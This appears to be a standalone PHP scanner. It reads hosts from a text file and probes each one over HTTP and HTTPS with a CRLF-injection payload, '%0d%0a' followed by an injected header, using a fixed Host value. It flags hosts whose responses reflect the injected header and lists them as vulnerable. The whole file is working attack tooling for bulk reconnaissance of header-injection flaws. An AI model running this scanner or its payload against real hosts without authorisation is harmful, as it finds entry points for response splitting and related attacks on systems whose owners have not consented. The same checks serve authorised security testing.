<?php

// Define the header name you want to inject
$headerName = "headername";

// Define the CRLF sequence you want to inject
$crlfSequence = "%0d%0a";

// Define the target list file
$targetListFile = "listip.txt";

// Function to check a single target for vulnerability
function checkTarget($target, $protocol, $headerName, $crlfSequence, &$vulnerableTargets) {
    $url = "$protocol://$target/";
    $payload = "/$crlfSequence$headerName:%20headervalue HTTP/1.1";
    $fullUrl = "$url$payload";

    try {
        $options = [
            "http" => [
                "method" => "GET",
                "header" => "Host: visit.hmetc.com\r\nConnection: close",
            ],
        ];

        $context = @stream_context_create($options);
        $responseHeaders = @get_headers($fullUrl, 1, $context);

        echo "Target: $target ($protocol)\n";
        echo "Payload Sent:\nGET $fullUrl\nHost: visit.hmetc.com\nConnection: close\n\n";

        if (is_array($responseHeaders)) {
            echo "Response Headers:\n";
            foreach ($responseHeaders as $name => $value) {
                if (is_string($name)) {
                    echo "$name: $value\n";
                }
            }
            echo "\n";
        }

        if (isset($responseHeaders[$headerName])) {
            echo "\033[0;31mVulnerable ($protocol)\033[0m\n\n";
            $vulnerableTargets[] = "$target ($protocol)";
        } else {
            echo "\033[0;32mNot vulnerable ($protocol)\033[0m\n\n";
        }
    } catch (Exception $e) {
        echo "Target: $target ($protocol)\n";
        echo "Payload Sent:\nGET $fullUrl\nHost: visit.hmetc.com\nConnection: close\n\n";
        echo "Error: {$e->getMessage()}\n\n";
    }
}

// Read a list of targets from a text file
$targets = file($targetListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// List to store vulnerable targets
$vulnerableTargets = [];

// Iterate through the targets and check for vulnerability
foreach ($targets as $target) {
    checkTarget($target, "http", $headerName, $crlfSequence, $vulnerableTargets);
    checkTarget($target, "https", $headerName, $crlfSequence, $vulnerableTargets);
}

// Print the list of vulnerable targets
echo "\n\033[0;31mVulnerable Targets:\033[0m\n";
foreach ($vulnerableTargets as $vulnerableTarget) {
    echo "$vulnerableTarget\n";
}

?>
